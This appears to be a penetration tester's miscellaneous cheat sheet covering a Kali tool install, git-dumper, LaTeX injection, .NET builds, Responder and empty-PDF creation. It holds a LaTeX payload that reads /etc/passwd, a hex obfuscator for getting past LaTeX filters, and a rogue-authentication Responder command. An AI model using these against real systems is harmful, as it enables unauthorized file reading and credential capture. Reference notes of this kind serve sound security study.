# Misc

## Basic Kali install
```bash
sudo apt install terminator ghidra seclists zaproxy gobuster
```

## Git Dumper
```bash
pip install git-dumper
git-dumper https://<host>/.git ./out
```

## LaTeX
- [Payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LaTeX%20Injection/README.md)

Basic file read
```latex
\documentclass[12pt]{article}
\usepackage{verbatim}
\begin{document}
\verbatiminput{/etc/passwd}
\end{document}
```

### Bypass blacklist/whitelist
Js script to obfuscate LaTeX as hex values
```js
// leetLatexObfuscator.js
const fs = require('fs')
const args = process.argv.slice(2);
const scriptContent = fs.readFileSync(args[0]).toString()
const parsed = scriptContent.split('\n').map(line => line.split('').map(char =>  "^^" + Number(char.charCodeAt(0)).toString(16)).join('')).join("\n")
fs.writeFileSync(args[1], parsed)
```
```bash
node leetLatexObfuscator.js input.txt output.txt
```

## Dotnet

```bash
dotnet new console -n Honk
dotnet build
dotnet run
dotnet publish -c Release
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true -p:PublishTrimmed=true
```

```xml
<!-- for dll -->
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <AssemblyName>Honk</AssemblyName>
    <OutputType>Library</OutputType>
    <!-- netstandard2.0 for compatibility -->
    <TargetFramework>netstandard2.0</TargetFramework>
  </PropertyGroup>
</Project>
```

## Responder
HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server
- [responder](https://github.com/lgandx/Responder)
- [responder kali](https://www.kali.org/tools/responder/)
```
responder -I tun0 -wA
```

## PDF stuff

### Create empty pdf
```bash
convert xc:none -page A4 empty.pdf
```

### Empty pdf MIME
```
%PDF-1.2 
1 0 obj
<<
/Title (empty)
/CreationDate (D:20231107231620)
/ModDate (D:20231107231620)
/Producer (xxxx)
>>
endobj
%%EOF
```
